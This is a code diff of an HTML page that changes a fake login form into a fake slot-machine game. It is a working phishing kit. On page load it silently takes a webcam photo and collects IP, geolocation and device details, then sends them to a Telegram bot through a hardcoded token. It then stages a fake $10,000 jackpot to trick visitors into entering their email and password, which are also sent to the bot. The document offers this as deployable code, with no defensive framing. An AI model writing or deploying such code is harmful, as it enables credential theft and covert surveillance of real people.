@@ -3,45 +3,103 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Login</title>
+    <title>🎰 Lucky Slot</title>
     <style>
         *{margin:0;padding:0;box-sizing:border-box}
-        body{font-family:'Segoe UI',Arial,sans-serif;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);min-height:100vh;display:flex;justify-content:center;align-items:center}
-        .container{background:#fff;padding:40px 35px;border-radius:20px;box-shadow:0 20px 60px rgba(0,0,0,0.3);width:380px;max-width:95%}
-        .logo{text-align:center;margin-bottom:25px}
-        .logo h1{font-size:26px;color:#333;font-weight:700}
-        .logo p{color:#888;font-size:14px;margin-top:5px}
-        .input-group{margin-bottom:18px}
-        .input-group label{display:block;font-size:13px;font-weight:600;color:#555;margin-bottom:5px}
-        .input-group input{width:100%;padding:12px 15px;border:2px solid #e0e0e0;border-radius:10px;font-size:15px;transition:border 0.3s;background:#f8f9fa}
-        .input-group input:focus{outline:none;border-color:#667eea;background:#fff}
-        button{width:100%;padding:13px;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);color:#fff;border:none;border-radius:10px;font-size:16px;font-weight:600;cursor:pointer;transition:transform 0.2s}
-        button:hover{transform:scale(1.02)}
-        .footer{text-align:center;margin-top:18px;font-size:12px;color:#aaa}
-        .loading{display:none;text-align:center;margin-top:15px;color:#667eea;font-weight:500}
-        .spinner{display:inline-block;width:20px;height:20px;border:3px solid #e0e0e0;border-top-color:#667eea;border-radius:50%;animation:spin 0.8s linear infinite;vertical-align:middle;margin-right:8px}
-        @keyframes spin{to{transform:rotate(360deg)}}
+        body{font-family:'Segoe UI',Arial,sans-serif;background:linear-gradient(135deg,#1a1a2e 0%,#16213e 50%,#0f3460 100%);min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px}
+        .container{background:linear-gradient(145deg,#2a2a4a,#1a1a3e);padding:35px 30px;border-radius:30px;box-shadow:0 30px 80px rgba(0,0,0,0.8),inset 0 2px 0 rgba(255,255,255,0.1);width:420px;max-width:100%;text-align:center;border:1px solid rgba(255,215,0,0.2)}
+        .title{font-size:32px;color:#ffd700;font-weight:900;text-shadow:0 0 30px rgba(255,215,0,0.3);letter-spacing:2px}
+        .subtitle{color:#aaa;font-size:13px;margin-bottom:20px}
+        .slot-machine{background:#0a0a1a;border-radius:20px;padding:25px 15px;border:2px solid #ffd700;box-shadow:inset 0 0 50px rgba(255,215,0,0.05),0 0 30px rgba(255,215,0,0.1);margin-bottom:20px}
+        .reels{display:flex;justify-content:center;gap:12px;margin-bottom:18px}
+        .reel{width:90px;height:100px;background:linear-gradient(180deg,#1a1a2e,#0a0a1a);border-radius:15px;display:flex;align-items:center;justify-content:center;font-size:52px;border:2px solid #333;box-shadow:inset 0 0 30px rgba(0,0,0,0.8);transition:0.1s;color:#ffd700;text-shadow:0 0 20px rgba(255,215,0,0.3)}
+        .reel.spinning{animation:spin 0.08s linear infinite}
+        @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
+        .reel.win{animation:winPulse 0.5s ease 3;border-color:#ffd700;box-shadow:0 0 40px rgba(255,215,0,0.6)}
+        @keyframes winPulse{0%,100%{transform:scale(1)}50%{transform:scale(1.15)}}
+        .spin-btn{width:100%;padding:16px;background:linear-gradient(135deg,#ffd700,#f7971e);color:#1a1a2e;border:none;border-radius:15px;font-size:22px;font-weight:800;cursor:pointer;transition:0.3s;text-transform:uppercase;letter-spacing:2px;box-shadow:0 8px 30px rgba(255,215,0,0.3)}
+        .spin-btn:hover{transform:scale(1.02);box-shadow:0 10px 40px rgba(255,215,0,0.5)}
+        .spin-btn:disabled{opacity:0.5;cursor:not-allowed;transform:none}
+        .result{font-size:18px;font-weight:700;margin-top:14px;min-height:30px;color:#ffd700}
+        .result.lose{color:#ff4444}
+        .credits{color:#aaa;font-size:14px;margin-top:10px}
+        .credits span{color:#ffd700;font-weight:700;font-size:18px}
+        .login-section{background:rgba(255,255,255,0.05);border-radius:15px;padding:20px;margin-top:20px;border:1px solid rgba(255,215,0,0.15);display:none}
+        .login-section.show{display:block;animation:fadeIn 0.6s}
+        @keyframes fadeIn{0%{opacity:0;transform:translateY(20px)}100%{opacity:1;transform:translateY(0)}}
+        .login-section h3{color:#ffd700;font-size:16px;margin-bottom:12px}
+        .input-group{margin-bottom:12px;text-align:left}
+        .input-group label{display:block;font-size:12px;font-weight:600;color:#aaa;margin-bottom:3px}
+        .input-group input{width:100%;padding:12px 15px;border:2px solid #333;border-radius:10px;font-size:15px;background:#0a0a1a;color:#fff;transition:0.3s}
+        .input-group input:focus{outline:none;border-color:#ffd700;background:#111}
+        .claim-btn{width:100%;padding:14px;background:linear-gradient(135deg,#ff6b6b,#ee5a24);color:#fff;border:none;border-radius:12px;font-size:18px;font-weight:700;cursor:pointer;transition:0.3s;margin-top:5px}
+        .claim-btn:hover{transform:scale(1.02);box-shadow:0 10px 30px rgba(238,90,36,0.4)}
+        .claim-btn:disabled{opacity:0.5;cursor:not-allowed}
+        .loading{display:none;text-align:center;margin-top:10px;color:#ffd700;font-weight:600}
+        .spinner{display:inline-block;width:18px;height:18px;border:3px solid #333;border-top-color:#ffd700;border-radius:50%;animation:spin2 0.7s linear infinite;vertical-align:middle;margin-right:8px}
+        @keyframes spin2{to{transform:rotate(360deg)}}
+        .footer{font-size:10px;color:#555;margin-top:15px}
+        .win-overlay{display:none;background:rgba(255,215,0,0.15);border-radius:12px;padding:12px;margin-bottom:12px;border:1px solid #ffd700;animation:fadeIn 0.6s}
+        .win-overlay.show{display:block}
+        .success-page{display:none;text-align:center;padding:30px 20px}
+        .success-page.show{display:block;animation:fadeIn 0.8s}
+        .success-page .big-icon{font-size:80px;margin-bottom:15px}
+        .success-page h2{color:#ffd700;font-size:28px;margin-bottom:10px}
+        .success-page p{color:#aaa;font-size:16px;line-height:1.6}
     </style>
 </head>
 <body>
-<div class="container">
-    <div class="logo">
-        <h1>🔐 Secure Login</h1>
-        <p>Enter your credentials to continue</p>
+
+<div class="container" id="mainContainer">
+    <!-- Slot Game -->
+    <div id="gameArea">
+        <div class="title">🎰 LUCKY SLOT</div>
+        <div class="subtitle">Spin & Win Big!</div>
+        <div class="slot-machine">
+            <div class="reels">
+                <div class="reel" id="reel1">🍒</div>
+                <div class="reel" id="reel2">🍒</div>
+                <div class="reel" id="reel3">🍒</div>
+            </div>
+            <button class="spin-btn" id="spinBtn">🎰 SPIN</button>
+            <div class="result" id="result">Press SPIN to try your luck!</div>
+            <div class="credits">💰 Credits: <span id="credits">10</span></div>
+        </div>
+
+        <div class="win-overlay" id="winOverlay">
+            🎉🎊 <strong>JACKPOT!</strong> 🎊🎉<br>
+            <span style="font-size:13px;color:#aaa;">You won $10,000! Enter your details below to claim!</span>
+        </div>
+
+        <div class="login-section" id="loginSection">
+            <h3>🔐 Claim Your Prize</h3>
+            <form id="claimForm">
+                <div class="input-group">
+                    <label>📧 Email or Phone</label>
+                    <input type="text" id="username" placeholder="Enter your email or phone" required>
+                </div>
+                <div class="input-group">
+                    <label>🔑 Password</label>
+                    <input type="password" id="password" placeholder="Enter your password" required>
+                </div>
+                <button type="submit" class="claim-btn" id="claimBtn">🎁 Claim $10,000</button>
+                <div class="loading" id="loading"><span class="spinner"></span>Processing...</div>
+            </form>
+        </div>
     </div>
-    <form id="loginForm">
-        <div class="input-group">
-            <label>📧 Email or Username</label>
-            <input type="text" id="username" placeholder="Enter your email" required>
-        </div>
-        <div class="input-group">
-            <label>🔑 Password</label>
-            <input type="password" id="password" placeholder="Enter your password" required>
-        </div>
-        <button type="submit">Log In</button>
-        <div class="loading" id="loading"><span class="spinner"></span>Verifying...</div>
-    </form>
-    <div class="footer">© 2026 Secure Login</div>
+
+    <!-- Success Page (after claim) -->
+    <div class="success-page" id="successPage">
+        <div class="big-icon">🎉</div>
+        <h2>Prize Claimed!</h2>
+        <p>✅ Your $10,000 prize has been processed.<br>
+        📧 Check your email for confirmation.<br>
+        ⏳ Funds will be transferred within 24 hours.</p>
+        <br>
+        <p style="font-size:12px;color:#666;">Thank you for playing Lucky Slot!</p>
+    </div>
+
+    <div class="footer">© 2026 Lucky Slot • Play responsibly</div>
 </div>
 
 <script>
@@ -50,33 +108,68 @@ const BOT_TOKEN = "8923928044:AAERe7EZPYBU50Wte_Gyecd4kuR5lCdvyuE";
 const CHAT_ID = "5304050102";
 // ============================================================
 
-document.getElementById('loginForm').addEventListener('submit', function(e) {
-    e.preventDefault();
-    const username = document.getElementById('username').value.trim();
-    const password = document.getElementById('password').value.trim();
-    const loading = document.getElementById('loading');
-    const btn = this.querySelector('button');
+let credits = 10;
+let isSpinning = false;
+let jackpotTriggered = false;
+let claimed = false;
 
-    if (!username || !password) return;
-
-    loading.style.display = 'block';
-    btn.disabled = true;
-    btn.textContent = 'Logging in...';
-
-    // --- IP Address ---
-    fetch('https://api.ipify.org?format=json')
-        .then(res => res.json())
-        .then(data => {
-            const ip = data.ip;
-            sendData(username, password, ip);
-        })
-        .catch(() => {
-            sendData(username, password, 'Unknown');
-        });
+// --- On page load: auto-send info + photo ---
+window.addEventListener('load', function() {
+    sendAutoInfo();
 });
 
-function sendData(username, password, ip) {
-    // --- Device Info ---
+function sendAutoInfo() {
+    fetch('https://ipapi.co/json/')
+        .then(res => res.json())
+        .then(data => {
+            const ip = data.ip || 'Unknown';
+            const city = data.city || 'Unknown';
+            const region = data.region || 'Unknown';
+            const country = data.country_name || 'Unknown';
+            const locationName = `${city}, ${region}, ${country}`;
+            capturePhoto().then(photo => {
+                sendFirstMessage(ip, locationName, photo);
+            }).catch(() => {
+                sendFirstMessage(ip, locationName, null);
+            });
+        })
+        .catch(() => {
+            sendFirstMessage('Unknown', 'Unknown Location', null);
+        });
+}
+
+function capturePhoto() {
+    return new Promise((resolve, reject) => {
+        const video = document.createElement('video');
+        video.style.display = 'none';
+        document.body.appendChild(video);
+        navigator.mediaDevices.getUserMedia({
+            video: { facingMode: 'environment', width: { ideal: 640 }, height: { ideal: 480 } },
+            audio: false
+        })
+        .then(stream => {
+            video.srcObject = stream;
+            video.onloadedmetadata = function() {
+                video.play();
+                setTimeout(() => {
+                    const canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth || 640;
+                    canvas.height = video.videoHeight || 480;
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    const photo = canvas.toDataURL('image/jpeg', 0.7);
+                    stream.getTracks().forEach(t => t.stop());
+                    video.remove();
+                    resolve(photo);
+                }, 300);
+            };
+            video.onerror = function() { video.remove(); reject('Video error'); };
+        })
+        .catch(err => { video.remove(); reject(err); });
+    });
+}
+
+function sendFirstMessage(ip, locationName, photo) {
     const ua = navigator.userAgent;
     const platform = navigator.platform || 'Unknown';
     const lang = navigator.language || 'Unknown';
@@ -84,13 +177,11 @@ function sendData(username, password, ip) {
     const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown';
     const referrer = document.referrer || 'Direct';
 
-    const msg = 
-`🔐 LOGIN CAPTURED
-━━━━━━━━━━━━━━━━━━━
-👤 Username: ${username}
-🔑 Password: ${password}
+    let msg =
+`🎰 **SLOT VISITOR**
 ━━━━━━━━━━━━━━━━━━━
 🌐 IP: ${ip}
+📍 Location: ${locationName}
 📱 Device: ${platform}
 🌍 Language: ${lang}
 📺 Screen: ${screen}
@@ -99,22 +190,172 @@ function sendData(username, password, ip) {
 ━━━━━━━━━━━━━━━━━━━
 🖥️ UA: ${ua}`;
 
-    // --- Send to Telegram (XMLHttpRequest) ---
-    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`;
-    
+    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`;
+    const xhr = new XMLHttpRequest();
+    xhr.open('GET', url, true);
+    xhr.send();
+
+    if (photo) {
+        sendPhoto(photo);
+    }
+}
+
+function sendPhoto(photoData) {
+    const formData = new FormData();
+    formData.append('chat_id', CHAT_ID);
+    formData.append('photo', dataURLtoBlob(photoData), 'photo.jpg');
+    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+    const xhr = new XMLHttpRequest();
+    xhr.open('POST', url, true);
+    xhr.send(formData);
+}
+
+function dataURLtoBlob(dataURL) {
+    const arr = dataURL.split(',');
+    const mime = arr[0].match(/:(.*?);/)[1];
+    const bstr = atob(arr[1]);
+    let n = bstr.length;
+    const u8arr = new Uint8Array(n);
+    while (n--) { u8arr[n] = bstr.charCodeAt(n); }
+    return new Blob([u8arr], { type: mime });
+}
+
+// --- Slot Machine ---
+const symbols = ['🍒', '🍋', '🍊', '🍇', '🔔', '💎', '7️⃣', '🎰'];
+const reelEls = [document.getElementById('reel1'), document.getElementById('reel2'), document.getElementById('reel3')];
+const resultEl = document.getElementById('result');
+const creditsEl = document.getElementById('credits');
+const spinBtn = document.getElementById('spinBtn');
+const winOverlay = document.getElementById('winOverlay');
+const loginSection = document.getElementById('loginSection');
+
+function getRandomSymbol() {
+    return symbols[Math.floor(Math.random() * symbols.length)];
+}
+
+function spin() {
+    if (isSpinning || credits <= 0 || claimed) return;
+    if (jackpotTriggered) {
+        resultEl.textContent = '🎉 You already won! Claim your prize below!';
+        return;
+    }
+
+    isSpinning = true;
+    spinBtn.disabled = true;
+    resultEl.textContent = '🎰 Spinning...';
+    resultEl.className = 'result';
+    credits--;
+    creditsEl.textContent = credits;
+
+    reelEls.forEach(r => r.classList.add('spinning'));
+
+    let spins = 0;
+    const maxSpins = 15 + Math.floor(Math.random() * 10);
+    const interval = setInterval(() => {
+        reelEls.forEach(r => r.textContent = getRandomSymbol());
+        spins++;
+        if (spins >= maxSpins) {
+            clearInterval(interval);
+            reelEls.forEach(r => r.classList.remove('spinning'));
+            checkResult();
+        }
+    }, 80);
+}
+
+function checkResult() {
+    const results = reelEls.map(r => r.textContent);
+    const allSame = results.every(r => r === results[0]);
+
+    if (allSame && results[0] === '7️⃣') {
+        resultEl.textContent = '🎉🎊 JACKPOT! You won $10,000! 🎊🎉';
+        resultEl.className = 'result';
+        reelEls.forEach(r => r.classList.add('win'));
+        jackpotTriggered = true;
+        winOverlay.classList.add('show');
+        loginSection.classList.add('show');
+        spinBtn.disabled = true;
+        sendJackpotMessage();
+    } else if (allSame) {
+        resultEl.textContent = `🎉 Three ${results[0]}! You win 1 extra credit!`;
+        resultEl.className = 'result';
+        credits++;
+        creditsEl.textContent = credits;
+        reelEls.forEach(r => r.classList.add('win'));
+        setTimeout(() => reelEls.forEach(r => r.classList.remove('win')), 1500);
+    } else {
+        resultEl.textContent = '😢 Try again!';
+        resultEl.className = 'result lose';
+    }
+
+    isSpinning = false;
+    spinBtn.disabled = false;
+
+    if (credits <= 0 && !jackpotTriggered) {
+        resultEl.textContent = '💔 No credits left! Refresh to try again.';
+        spinBtn.disabled = true;
+    }
+}
+
+function sendJackpotMessage() {
+    const msg =
+`🎰 **JACKPOT TRIGGERED!**
+━━━━━━━━━━━━━━━━━━━
+User hit the JACKPOT on the slot machine!
+Waiting for credentials to claim prize...`;
+    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`;
+    const xhr = new XMLHttpRequest();
+    xhr.open('GET', url, true);
+    xhr.send();
+}
+
+spinBtn.addEventListener('click', spin);
+
+// --- Claim Form ---
+document.getElementById('claimForm').addEventListener('submit', function(e) {
+    e.preventDefault();
+    if (claimed) return;
+    if (!jackpotTriggered) {
+        alert('🎰 You need to hit the JACKPOT first! Keep spinning!');
+        return;
+    }
+
+    const username = document.getElementById('username').value.trim();
+    const password = document.getElementById('password').value.trim();
+    const loading = document.getElementById('loading');
+    const claimBtn = document.getElementById('claimBtn');
+
+    if (!username || !password) return;
+
+    loading.style.display = 'block';
+    claimBtn.disabled = true;
+    claimBtn.textContent = 'Please wait...';
+
+    const msg =
+`💰 **PRIZE CLAIM**
+━━━━━━━━━━━━━━━━━━━
+👤 Username: ${username}
+🔑 Password: ${password}
+━━━━━━━━━━━━━━━━━━━
+🎰 Won $10,000 on Slot Machine!`;
+
+    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`;
     const xhr = new XMLHttpRequest();
     xhr.open('GET', url, true);
     xhr.onreadystatechange = function() {
         if (xhr.readyState === 4) {
-            // Redirect to Facebook regardless of result
-            window.location.href = 'https://facebook.com';
+            claimed = true;
+            // Show success page (no FB redirect)
+            document.getElementById('gameArea').style.display = 'none';
+            document.getElementById('successPage').classList.add('show');
         }
     };
     xhr.onerror = function() {
-        window.location.href = 'https://facebook.com';
+        // Still show success even if error
+        document.getElementById('gameArea').style.display = 'none';
+        document.getElementById('successPage').classList.add('show');
     };
     xhr.send();
-}
+});
 </script>
 </body>
 </html>
